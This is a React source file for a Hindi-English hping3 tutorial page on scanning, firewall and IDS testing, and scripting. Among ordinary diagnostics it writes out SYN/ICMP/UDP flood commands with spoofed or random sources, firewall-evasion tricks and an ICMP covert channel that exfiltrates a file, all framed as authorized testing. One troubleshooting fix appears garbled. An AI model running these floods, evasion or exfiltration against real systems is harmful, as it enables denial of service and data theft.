import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Hping3() {
  return (
    <TutorialLayout
      title="hping3"
      subtitle="नेटवर्क पैकेट क्राफ्टिंग और स्कैनिंग टूल — TCP, UDP, ICMP"
      icon="🏓"
      prev={{ to: '/tool/airgeddon', label: 'airgeddon' }}
      next={{ to: '/tool/binwalk', label: 'binwalk' }}
    >
      <h2>What is Hping3?</h2>
      <p>
        Hping3 एक powerful command-line packet crafting tool है जो custom TCP/IP packets बनाता है। यह ping command जैसा है लेकिन बहुत ज़्यादा powerful — TCP, UDP, ICMP, और RAW-IP packets create कर सकते हो। Network security testing, firewall analysis, और troubleshooting में यह essential tool है।
      </p>
      <p>
        Hping3 को Salvatore Sanfilippo (antirez) ने बनाया है — वही developer जिन्होंने Redis database बनाया। यह C language में लिखा गया है और open source है। hping3 raw sockets use करके packets बनाता है जिससे आप हर packet field individually control कर सकते हो — TCP flags, source/destination IP, ports, TTL, window size, data payload — सब कुछ।
      </p>
      <p>
        Nmap से अलग hping3 specific packet parameters control करने के लिए design किया गया है। Nmap scanning tool है, hping3 packet crafting tool है। SYN flood testing, firewall rule testing, network troubleshooting, और OS fingerprinting — यह सब hping3 की specialties हैं।
      </p>
      <p>
        hping3 network engineers और security professionals दोनों के लिए useful है। Network troubleshooting में specific port पर connectivity test कर सकते हो, firewall rules verify कर सकते हो, और network path analyze कर सकते हो। Security testing में port scanning, firewall bypass testing, और DoS resilience testing कर सकते हो।
      </p>
      <p>
        hping3 का Tcl scripting engine इसे बाकि packet tools से अलग बनाता है। Built-in scripting support से automated tests लिख सकते हो — loops, conditionals, variables सब support होता है। यह Scapy जैसा flexibility देता है लेकिन Python install किए बिना — सिर्फ hping3 binary से काम चल जाता है।
      </p>
      <p>
        hping3 की output interpretation important है। SYN-ACK (SA) response मतलब port open है। RST-ACK (RA) response मतलब port closed है। कोई response नहीं आ रहा तो firewall packets drop कर रहा है (filtered)। Window size values से open और closed ports distinguish कर सकते हो — open ports usually larger window size return करते हैं।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> hping3 केवल authorized penetration testing और network troubleshooting के लिए use करें। बिना permission के DoS attacks, port scanning, या packet flooding illegal है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized network attacks अपराध है। केवल अपने lab या written permission के साथ use करें।
      </div>

      <h2>History of Hping3</h2>
      <p>
        hping का पहला version 1998 में Salvatore Sanfilippo (antirez) ने बनाया था। antirez बाद में Redis database के creator के रूप में famous हुए, लेकिन hping उनका पहला major open source project था। hping ने packet crafting को accessible बनाया — पहले जो काम raw socket programming से होता था, वो hping से simple command-line flags से होने लगा।
      </p>
      <p>
        hping1 basic TCP/UDP/ICMP packets बनाता था — limited features थे लेकिन उस time यह revolutionary था। hping2 में traceroute और advanced features add हुए — fingerprinting, firewall detection, और better response parsing। hping3 (current version) में Tcl scripting support, flood mode, और बेहतर packet control add हुआ। यह Kali Linux और Nethunter में pre-installed आता है।
      </p>
      <p>
        2000 के दशक में hping3 network security testing का standard tool बन गया। Firewall vendors ने अपने products test करने के लिए hping3 use किया। SANS Institute ने अपने security courses में hping3 को include किया। यह tool network protocol understanding के लिए educational tool के रूप में भी popular हुआ। Security researchers ने hping3 use करके multiple firewall vulnerabilities discover किए।
      </p>
      <p>
        hping3 का development 2005 के बाद slow हो गया — antirez का focus Redis पर shift हो गया। लेकिन hping3 आज भी Kali Linux, Parrot OS, और Nethunter में included है। Community ने इसे maintain रखा है। Scapy (Python-based) ने hping3 की जगह ले ली complex use cases के लिए, लेकिन quick CLI testing के लिए hping3 आज भी best option है। hping3 का legacy packet crafting tools की नींव है — इसने prove किया कि command-line से powerful network testing possible है।
      </p>

      <h2>How Hping3 Works?</h2>
      <p>
        hping3 raw sockets use करके custom packets बनाता है। Operating system का raw socket API use करके hping3 packets को directly network interface card पर send करता है — kernel का TCP/IP stack bypass होता है। यही कारण है कि root access ज़रूरी है।
      </p>
      <p>
        hping3 packet construction process: पहले protocol header build होता है (TCP/UDP/ICMP), फिर IP header add होता है, फिर user-specified flags और options set होते हैं, और finally raw socket से packet send हो जाता है। Response packets को capture करके hping3 analyze करता है — response time, flags, window size, TTL सब record होता है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Packet Crafting:</strong> TCP, UDP, ICMP, RAW-IP packets create करता है — हर field customize कर सकते हो</li>
        <li><strong className="text-white">Flag Control:</strong> TCP flags (SYN, ACK, FIN, RST, PSH, URG) individually set कर सकते हो — unusual combinations test कर सकते हो</li>
        <li><strong className="text-white">Source Spoofing:</strong> Source IP और port spoof कर सकता है — firewall bypass और anti-trace testing के लिए</li>
        <li><strong className="text-white">Traceroute:</strong> TCP/UDP/ICMP traceroute support करता है — ICMP blocked networks में भी काम करता है</li>
        <li><strong className="text-white">Flood Mode:</strong> Fast packet flooding for stress testing — rate control options available हैं</li>
        <li><strong className="text-white">Firewall Testing:</strong> Firewall rules test करने के लिए best tool — alag-alag flags और techniques use कर सकते हो</li>
        <li><strong className="text-white">Response Analysis:</strong> Response packets parse करके detailed information provide करता है — latency, port state, OS fingerprint</li>
        <li><strong className="text-white">Tcl Scripting:</strong> Built-in scripting engine से automated tests लिख सकते हो — loops, conditionals, variables support</li>
      </ul>

      <h2>Installation</h2>
      <p>
        hping3 ज़्यादातर Linux distributions में repository में available है। Nethunter और Kali Linux में pre-installed आता है। Source से compile करने का option भी है अगर latest features चाहिए।
      </p>
      <CodeBlock
        title="hping3 Installation"
        code={`# Kali Linux / Nethunter (pre-installed):
sudo apt update
sudo apt install hping3

# Debian/Ubuntu:
sudo apt install hping3

# Arch Linux:
sudo pacman -S hping3

# Fedora/RHEL:
sudo dnf install hping3

# Termux (Android):
pkg install hping

# Source se build:
git clone https://github.com/antirez/hping.git
cd hping
./configure
make
sudo make install

# Version check:
hping3 --version

# Help:
hping3 --help

# Man page:
man hping3`}
      />

      <h2>Basic Usage</h2>
      <p>
        hping3 basic commands simple हैं — protocol type, target IP, और port specify करो। Response analyze करके port state और firewall behavior समझो। Verbose mode (-V) हमेशा use करो — detailed information मिलती है।
      </p>
      <CodeBlock
        title="Basic Commands"
        code={`# ICMP ping:
sudo hping3 -1 target_ip

# TCP SYN ping:
sudo hping3 -S -p 80 target_ip

# TCP connect test:
sudo hping3 -S -p 443 target_ip

# UDP ping:
sudo hping3 -2 -p 53 target_ip

# Multiple packets:
sudo hping3 -S -c 5 -p 80 target_ip

# Verbose output:
sudo hping3 -V -S -p 80 target_ip

# Specific interface:
sudo hping3 -S -p 80 -I wlan0 target_ip

# Check multiple ports quickly:
sudo hping3 -S -c 1 -p 22 target_ip
sudo hping3 -S -c 1 -p 80 target_ip
sudo hping3 -S -c 1 -p 443 target_ip

# Quiet mode (less output):
sudo hping3 -S -c 3 -p 80 -q target_ip`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-S</td><td className="py-2 px-3">SYN flag set करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-A</td><td className="py-2 px-3">ACK flag set करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-F</td><td className="py-2 px-3">FIN flag set करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-R</td><td className="py-2 px-3">RST flag set करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-P</td><td className="py-2 px-3">PSH flag set करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-U</td><td className="py-2 px-3">URG flag set करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-1</td><td className="py-2 px-3">ICMP mode</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-2</td><td className="py-2 px-3">UDP mode</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p</td><td className="py-2 px-3">Destination port</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-s</td><td className="py-2 px-3">Source port</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--flood</td><td className="py-2 px-3">Fast packet sending (flood mode)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--rand-source</td><td className="py-2 px-3">Random source IP</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c</td><td className="py-2 px-3">Packet count</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-i</td><td className="py-2 px-3">Interval (u=usec, m=msec)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-d</td><td className="py-2 px-3">Data size (bytes)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-T</td><td className="py-2 px-3">Traceroute mode</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--spoof</td><td className="py-2 px-3">Spoof source IP</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-f</td><td className="py-2 px-3">Fragment packets</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-V</td><td className="py-2 px-3">Verbose mode</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-I</td><td className="py-2 px-3">Network interface select</td></tr>
          </tbody>
        </table>
      </div>

      <h2>TCP SYN Scan</h2>
      <p>
        SYN scan सबसे common scan type है — half-open scan भी कहते हैं। TCP handshake complete नहीं होता।
      </p>
      <CodeBlock
        title="SYN Scan"
        code={`# Single port SYN scan:
sudo hping3 -S -p 80 target_ip

# Port range scan (++ port increment):
sudo hping3 -S -p ++80 target_ip
# 80, 81, 82... एक-एक करके scan होगा

# Multiple specific ports:
sudo hping3 -S -p 22 target_ip
sudo hping3 -S -p 80 target_ip
sudo hping3 -S -p 443 target_ip

# Count set करो (3 packets per port):
sudo hping3 -S -c 3 -p 80 target_ip

# Source port spoof (DNS port 53):
sudo hping3 -S -s 53 -p 80 target_ip

# Response analyze:
# SA (SYN-ACK) = port OPEN
# RA (RST-ACK) = port CLOSED
# कोई response नहीं = filtered/firewall`}
      />

      <h2>TCP ACK Scan</h2>
      <CodeBlock
        title="ACK Scan (Firewall Detection)"
        code={`# ACK scan — firewall rules detect करता है:
sudo hping3 -A -p 80 target_ip

# अगर RST response आए → port unfiltered (no stateful firewall)
# अगर कोई response नहीं → port filtered (stateful firewall)

# ACK scan with count:
sudo hping3 -A -c 5 -p 80 target_ip

# Window size analysis:
sudo hping3 -A -p 80 target_ip
# Open ports: window size > 0
# Closed ports: window size = 0

# ACK scan for firewall bypass testing:
sudo hping3 -A -p 443 -s 53 target_ip`}
      />

      <h2>UDP Scan</h2>
      <CodeBlock
        title="UDP Scanning"
        code={`# UDP port scan:
sudo hping3 -2 -p 53 target_ip

# DNS query test:
sudo hping3 -2 -p 53 target_ip

# SNMP test:
sudo hping3 -2 -p 161 target_ip

# TFTP test:
sudo hping3 -2 -p 69 target_ip

# UDP scan note:
# Closed port → ICMP "port unreachable" response
# Open port → कोई response नहीं (UDP is connectionless)
# Filtered → कोई response नहीं (firewall blocking)`}
      />

      <h2>ICMP Operations</h2>
      <CodeBlock
        title="ICMP Testing"
        code={`# Basic ICMP ping:
sudo hping3 -1 target_ip

# ICMP with count:
sudo hping3 -1 -c 10 target_ip

# ICMP timestamp request:
sudo hping3 --icmptype 13 target_ip

# ICMP address mask request:
sudo hping3 --icmptype 17 target_ip

# ICMP flood (authorized testing only):
sudo hping3 -1 --flood target_ip

# ICMP with data size:
sudo hping3 -1 -d 1000 target_ip`}
      />

      <h2>SYN Flood (Stress Testing)</h2>
      <div className="warning-box mb-6">
        <strong>⚠️ चेतावनी:</strong> SYN flood testing केवल authorized testing और अपने servers पर ही करें। बिना permission के DoS attack illegal है।
      </div>
      <CodeBlock
        title="Flood Testing"
        code={`# SYN flood (apne server पर test):
sudo hping3 -S --flood -p 80 target_ip

# Flood with random source:
sudo hping3 -S --rand-source --flood -p 80 target_ip

# ICMP flood:
sudo hping3 -1 --flood target_ip

# UDP flood:
sudo hping3 --udp --flood -p 53 target_ip

# Rate-limited flood:
sudo hping3 -S --flood -p 80 --interval u1000 target_ip
# u1000 = 1000 microsecond delay between packets

# Count-limited flood:
sudo hping3 -S --flood -c 10000 -p 80 target_ip

# Monitor (alag terminal में):
watch -n 1 "netstat -an | grep :80 | wc -l"`}
      />

      <h2>Traceroute</h2>
      <CodeBlock
        title="Advanced Traceroute"
        code={`# TCP traceroute (port 80):
sudo hping3 -T -p 80 target_ip

# ICMP traceroute:
sudo hping3 --traceroute -1 target_ip

# UDP traceroute:
sudo hping3 --traceroute --udp -p 53 target_ip

# Specific TTL range:
sudo hping3 -T -p 80 --ttl 5 target_ip

# Traceroute with spoofed source:
sudo hping3 -T -p 80 --spoof fake_ip target_ip

# TCP traceroute ICMP se better hai:
# - Firewalls ICMP block karte hain usually
# - TCP port 80/443 ज़्यादातर open होते हैं
# - More accurate results milti hain`}
      />

      <h2>Firewall Testing</h2>
      <CodeBlock
        title="Firewall Rule Analysis"
        code={`# Firewall bypass test (alag source port):
sudo hping3 -S -p 80 -s 53 target_ip

# Fragmented packets (bypass stateless firewall):
sudo hping3 -S -p 80 -f target_ip

# Multiple TCP flags:
sudo hping3 -S -A -F -P -U target_ip -p 80

# Window size test:
sudo hping3 -S -p 80 -W 65535 target_ip

# Bad checksum (detect stateful inspection):
sudo hping3 -S -p 80 --badcksum target_ip

# Firewall testing script:
#!/bin/bash
TARGET=$1
echo "[*] Firewall testing on $TARGET..."

for flag in -S -A -F -R -P -U; do
  echo "[*] Testing flag: $flag"
  sudo hping3 $flag -c 3 -p 80 $TARGET
  sleep 1
done

echo "[*] Testing fragmented packets..."
sudo hping3 -S -f -c 3 -p 80 $TARGET

echo "[*] Testing source port 53..."
sudo hping3 -S -s 53 -c 3 -p 80 $TARGET

echo "[*] Firewall testing complete."`}
      />

      <h2>OS Fingerprinting</h2>
      <CodeBlock
        title="OS Detection"
        code={`# TTL check (OS detection):
sudo hping3 -1 target_ip
# Linux: TTL=64
# Windows: TTL=128
# Cisco/Network: TTL=255

# Window size fingerprinting:
sudo hping3 -S target_ip -p 80
# Different OS use different default window sizes

# XMAS scan:
sudo hping3 -F -P -U target_ip -p 80

# NULL scan (no flags):
sudo hping3 target_ip -p 80

# FIN scan:
sudo hping3 -F target_ip -p 80

# Combined flags fingerprinting:
sudo hping3 -S -A -F -P target_ip -p 80`}
      />

      <h2>hping3 vs Other Tools</h2>
      <p>
        Packet crafting aur network testing के लिए multiple tools available हैं। हर tool की अपनी strengths और weaknesses हैं। hping3 CLI-based quick testing के लिए best है, Scapy complex automation के लिए, और Nmap comprehensive scanning के लिए।
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">hping3</th>
              <th className="text-left py-2 px-3 text-neon-green">Nmap</th>
              <th className="text-left py-2 px-3 text-neon-green">Scapy</th>
              <th className="text-left py-2 px-3 text-neon-green">nping</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Packet Control</td><td className="py-2 px-3">Full (flags, fields)</td><td className="py-2 px-3">Limited</td><td className="py-2 px-3">Full (Python)</td><td className="py-2 px-3">Good</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Service Detection</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (-sV)</td><td className="py-2 px-3">Manual</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">OS Detection</td><td className="py-2 px-3">Manual (TTL)</td><td className="py-2 px-3">Automatic (-O)</td><td className="py-2 px-3">Manual</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Flood Testing</td><td className="py-2 px-3">हाँ (--flood)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (scripted)</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Firewall Testing</td><td className="py-2 px-3">Excellent</td><td className="py-2 px-3">Basic</td><td className="py-2 px-3">Excellent</td><td className="py-2 px-3">Good</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Scripting</td><td className="py-2 px-3">Tcl (built-in)</td><td className="py-2 px-3">NSE (Lua)</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Learning Curve</td><td className="py-2 px-3">Easy (CLI)</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Hard (Python)</td><td className="py-2 px-3">Easy</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Protocol Support</td><td className="py-2 px-3">TCP/UDP/ICMP</td><td className="py-2 px-3">TCP/UDP/ICMP+</td><td className="py-2 px-3">All protocols</td><td className="py-2 px-3">TCP/UDP/ICMP</td></tr>
            <tr><td className="py-2 px-3 text-white">Best For</td><td className="py-2 px-3">Packet crafting, firewall</td><td className="py-2 px-3">Comprehensive scanning</td><td className="py-2 px-3">Custom protocols</td><td className="py-2 px-3">Nmap integration</td></tr>
          </tbody>
        </table>
      </div>
      <p className="mt-4">
        Quick recommendation: General scanning के लिए Nmap use करो। Firewall testing और packet crafting के लिए hping3। Complex protocol automation के लिए Scapy। Nmap workflow में packet testing के लिए nping। सब tools complement करते हैं — एक-दूसरे की replacement नहीं हैं।
      </p>

      <h2>Real-World Case Studies</h2>
      <p>
        Case Study 1 — Firewall Audit: एक company ने new firewall deploy किया था और verify करना था कि rules correctly configured हैं। hping3 से different TCP flags (SYN, ACK, FIN, RST) भेजकर test किया। Result: Port 80/443 open थे (expected), port 22 filtered था (expected), लेकिन port 3389 (RDP) भी open मिला — यह security gap था। hping3 ने 5 minutes में यह issue identify कर दिया जो Nmap scan में 30 minutes लगते।
      </p>
      <p>
        Case Study 2 — DDoS Resilience Test: एक e-commerce company ने अपने servers की DDoS resilience test करनी थी। hping3 के --flood mode से SYN flood test किया। Initial result: server 10,000 packets/sec handle नहीं कर पा रहा था। SYN cookies enable किया, rate limiting add किया, और CDN configure किया। Second test: server 100,000 packets/sec handle करने लगा। hping3 से before/after comparison possible हुआ।
      </p>
      <p>
        Case Study 3 — Network Troubleshooting: एक bank के branch office में application intermittent timeout दे रही थी। Nmap से scan किया — ports open दिख रहे थे। hping3 से specific port पर repeated packets भेजे — 10% packets drop हो रहे थे। Issue: faulty network switch था। hping3 का packet-level control ने यह subtle issue detect किया जो regular tools miss कर गए।
      </p>

      <h2>Performance Tuning</h2>
      <p>
        hping3 को efficiently use करने के लिए कुछ optimization techniques:
      </p>
      <CodeBlock
        title="Optimization Techniques"
        code={`# 1. Rate limiting (system overload prevent):
sudo hping3 -S --flood -p 80 --interval u1000 target_ip
# u1000 = 1000 microsecond delay = 1000 packets/sec

# 2. Count limit (controlled testing):
sudo hping3 -S -c 1000 -p 80 target_ip

# 3. Specific interface use करो:
sudo hping3 -S -p 80 -I eth0 target_ip
# Wrong interface select होने से बचो

# 4. Output redirect (verbose mode fast):
sudo hping3 -S -c 100 -p 80 target_ip > results.txt 2>&1

# 5. Parallel scanning (multiple terminals):
# Terminal 1: sudo hping3 -S -p 80 target_ip
# Terminal 2: sudo hping3 -S -p 443 target_ip
# Terminal 3: sudo hping3 -2 -p 53 target_ip

# 6. Minimal data size:
sudo hping3 -S -p 80 -d 0 target_ip
# Data payload = 0 (सिर्फ header)

# 7. Fast interval for quick scan:
sudo hping3 -S -p ++1 -c 1000 -i u10000 target_ip
# Port 1 से 1000 तक scan, 10ms interval`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        hping3 results को properly analyze और document करना important है:
      </p>
      <CodeBlock
        title="Results Analysis"
        code={`# Response time analysis:
sudo hping3 -S -c 10 -p 80 target_ip
# Output में rtt (round-trip time) दिखता है
# Average response time calculate करो

# Port status summary:
sudo hping3 -S -p ++1 -c 1 target_ip 2>&1 | grep -E "flags|unreachable"
# SA = Open, RA = Closed, No response = Filtered

# Firewall behavior document करो:
echo "=== Firewall Test Report ===" > report.txt
echo "Target: $TARGET" >> report.txt
echo "Date: $(date)" >> report.txt
echo "" >> report.txt

# Test each flag:
for flag in S A F R P U; do
  result=$(sudo hping3 -$flag -c 3 -p 80 $TARGET 2>&1)
  echo "Flag $flag: $result" >> report.txt
done

# Fragmentation test:
echo "" >> report.txt
echo "Fragmentation Test:" >> report.txt
sudo hping3 -S -f -c 3 -p 80 $TARGET >> report.txt 2>&1

echo "=== Report Complete ===" >> report.txt

# Response pattern analysis:
sudo hping3 -S -c 100 -p 80 target_ip 2>&1 | grep -c "SA"
# SA count = open responses
# Compare with total sent = success rate`}
      />

      <h2>Tcl Scripting</h2>
      <p>
        hping3 में built-in Tcl scripting engine है — automated tests लिख सकते हो:
      </p>
      <CodeBlock
        title="Tcl Script Examples"
        code={`# hping3 Tcl script (firewall_test.hping):
# यह script firewall rules systematically test करता है

set target "192.168.1.100"
set ports {22 80 443 3389 8080}

# हर port पर SYN test:
foreach port $ports {
    puts "Testing port $port..."
    hping3 -S -c 3 -p $port $target
    after 1000
}

# हर flag type test करो:
set flags {S A F R P U}
foreach flag $flags {
    puts "Testing flag $flag on port 80..."
    hping3 -$flag -c 3 -p 80 $target
    after 1000
}

# Fragmentation test:
puts "Testing fragmented packets..."
hping3 -S -f -c 3 -p 80 $target

# Script run करो:
# hping3 -f firewall_test.hping

# Loop-based port scan:
for {set port 1} {$port <= 100} {incr port} {
    hping3 -S -c 1 -p $port 192.168.1.100
}

# Conditional test:
set result [hping3 -S -c 1 -p 80 192.168.1.100]
if {[string match "*SA*" $result]} {
    puts "Port 80 is OPEN"
} else {
    puts "Port 80 is CLOSED/FILTERED"
}`}
      />

      <h2>IDS/IPS Testing</h2>
      <p>
        Intrusion Detection Systems (IDS) और Intrusion Prevention Systems (IPS) की effectiveness test करने के लिए hping3 excellent tool है। Different attack signatures generate करके देख सकते हो कि IDS/IPS correctly detect कर रहा है या नहीं।
      </p>
      <p>
        IDS testing में false positive और false negative rates measure करना important है। hping3 से known attack patterns भेजो और check करो कि alerts generate हो रहे हैं या नहीं। अगर IDS detect नहीं कर रहा तो rules update करने की ज़रूरत है।
      </p>
      <CodeBlock
        title="IDS/IPS Detection Testing"
        code={`# SYN flood detection test:
sudo hping3 -S --flood -c 1000 -p 80 target_ip
# Expected: IDS should alert on high SYN rate

# Port scan detection test:
for port in 21 22 23 25 53 80 110 443 993 995; do
  sudo hping3 -S -c 1 -p $port target_ip
  sleep 0.5
done
# Expected: IDS should alert on port scan pattern

# Fragmented packet detection:
sudo hping3 -S -f -c 50 -p 80 target_ip
# Expected: IDS should detect fragmentation-based evasion

# Source port evasion test:
sudo hping3 -S -s 53 -c 10 -p 80 target_ip
sudo hping3 -S -s 67 -c 10 -p 80 target_ip
# Check if IDS correctly identifies spoofed source ports

# FIN scan detection:
sudo hping3 -F -c 10 -p 80 target_ip
# Expected: IDS should detect stealthy FIN scan

# XMAS scan detection:
sudo hping3 -F -P -U -c 10 -p 80 target_ip
# Expected: IDS should detect XMAS scan attempt`}
      />

      <h2>Covert Channels</h2>
      <p>
        hping3 data exfiltration के लिए covert channels बनाने में use हो सकता है। ICMP, TCP, और UDP headers में data hide करके normal traffic के through data transfer कर सकते हो। यह technique authorized red team exercises में use होती है।
      </p>
      <p>
        Covert channels का concept simple है — normal-looking packets के payload में sensitive data embed करो। Receiver side पर packets capture करके payload extract करो। ICMP covert channel सबसे common है क्योंकि ICMP traffic usually suspicious नहीं माना जाता।
      </p>
      <CodeBlock
        title="Covert Channel Techniques"
        code={`# ICMP covert channel (data in ICMP payload):
# Sender side:
sudo hping3 -1 -d 100 -E secret_message.txt target_ip

# Receiver side (tcpdump):
sudo tcpdump -i eth0 -nn -X icmp and host sender_ip
# ICMP payload में hidden data दिखेगा

# TCP covert channel (data in TCP data):
sudo hping3 -S -p 80 -d 50 target_ip
# Custom data payload में embed करो

# UDP covert channel:
sudo hping3 -2 -p 53 -d 100 target_ip
# DNS port पर UDP packets — less suspicious

# TTL-based covert channel:
# Sender: TTL values encode करो (1=bit0, 2=bit1)
sudo hping3 -S -p 80 --ttl 1 target_ip  # bit 0
sudo hping3 -S -p 80 --ttl 2 target_ip  # bit 1

# Important notes:
# - Covert channels detect हो सकते हैं IDS से
# - Payload inspection tools detect कर सकते हैं
# - सिर्फ authorized red team exercises में use करें`}
      />

      <h2>Packet Analysis with hping3</h2>
      <p>
        hping3 response packets analyze करके target system के बारे में valuable information gather कर सकते हो। TCP window size, TTL values, और response patterns से OS fingerprinting, service detection, और network topology mapping possible है।
      </p>
      <CodeBlock
        title="Response Analysis Techniques"
        code={`# Window size analysis:
sudo hping3 -S -p 80 target_ip
# Response window size note करो — different OS अलग values use करते हैं
# Linux: 5840, 14600, 29200
# Windows: 65535, 16384
# macOS: 65535

# TTL analysis:
sudo hping3 -1 target_ip
# TTL values से hop count estimate करो
# Initial TTL: Linux=64, Windows=128, Cisco=255

# TCP sequence number analysis:
sudo hping3 -S -c 5 -p 80 target_ip
# Sequence numbers check करो — random vs incremental
# Random = good security practice
# Incremental = potential vulnerability

# Response time analysis:
sudo hping3 -S -c 10 -i u100000 -p 80 target_ip
# Response times measure करो — network latency analysis

# Port state consistency check:
sudo hping3 -S -c 10 -p 80 target_ip 2>&1 | grep -c "flags=SA"
# Consistent responses = stable service
# Inconsistent = load balancer or rate limiting`}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        hping3 अकेले powerful है लेकिन other tools के साथ combine करने और भी ज़्यादा effective बन जाता है। Nmap, tcpdump, Wireshark, और custom scripts के साथ hping3 को integrate करके comprehensive security testing workflow बना सकते हो।
      </p>
      <CodeBlock
        title="hping3 with tcpdump and Nmap"
        code={`# hping3 + tcpdump (packet capture):
# Terminal 1 — capture:
sudo tcpdump -i eth0 -nn -w capture.pcap host target_ip

# Terminal 2 — send:
sudo hping3 -S -c 10 -p 80 target_ip

# Analysis:
wireshark capture.pcap

# hping3 + Nmap combo:
# Step 1: hping3 से firewall test:
sudo hping3 -S -c 3 -p 80 target_ip
sudo hping3 -A -c 3 -p 80 target_ip

# Step 2: Nmap से detailed scan (ports confirmed open):
nmap -sV -sC -p 80,443 target_ip

# hping3 + grep for automation:
sudo hping3 -S -c 1 -p 80 target_ip 2>&1 | grep -o "flags=SA"
# SA = SYN-ACK = port open

# hping3 + netstat monitoring:
# Terminal 1: watch -n 1 "netstat -an | grep SYN_RECV | wc -l"
# Terminal 2: sudo hping3 -S --flood -p 80 target_ip

# hping3 + iptables logging:
# iptables -A INPUT -p tcp --dport 80 -j LOG --log-prefix "HPING3: "
# hping3 packets को syslog में track करो`}
      />

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Permission denied error', a: 'hping3 raw sockets use करता है — root privileges चाहिए। sudo लगाओ: sudo hping3 -S target_ip। या capability set करो: sudo setcap cap_net_raw+ep $(which hping3)' },
          { q: 'कोई response नहीं आ रहा', a: 'Firewall block कर रहा होगा। Different source port try करो: -s 53। Fragmented packets try करो: -f। Verbose mode: -V। ICMP ping test: -1 target_ip' },
          { q: 'Kernel warning आ रहा है', a: 'Normal है raw sockets के साथ। Ignore करो या kernel parameter set करो: echo 1 | sudo tee /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts' },
          { q: 'Flood mode में system slow हो रहा है', a: 'Rate limit set करो: --interval u1000 (1000 microsecond delay)। या count limit: -c 10000। Interface specific करो: -I eth0' },
          { q: 'Windows पर चलता है?', a: 'नहीं, hping3 सिर्फ Linux/Unix पर चलता है। Windows पर hping2 try करो या VM में Kali use करो।' },
          { q: 'Scan results accurate नहीं हैं', a: 'Count बढ़ाओ: -c 5 (5 packets per port)। Verbose mode: -V। Different flags try करो — SYN, ACK, FIN।' },
          { q: 'hping3 से bandwidth test कर सकते हैं?', a: 'नहीं, hping3 bandwidth testing tool नहीं है। iperf3 use करो bandwidth measurement के लिए। hping3 packet-level testing के लिए है — connectivity, firewall rules, port status।' },
          { q: 'Multiple targets पर scan कैसे करें?', a: 'Loop use करो: for ip in 192.168.1.{1..254}; do sudo hping3 -S -c 1 -p 80 $ip; done। या script बनाओ जो IPs read करे file से।' },
          { q: 'Output file में save कैसे करें?', a: 'Redirect use करो: sudo hping3 -S -p 80 target_ip 2>&1 | tee output.txt। या -V verbose output capture करो analysis के लिए।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        hping3-based attacks से बचने के लिए multiple layers की defense ज़रूरी है। Single solution sufficient नहीं है — firewall, IDS, rate limiting, और monitoring सब मिलकर defense-in-depth strategy बनाते हैं।
      </p>
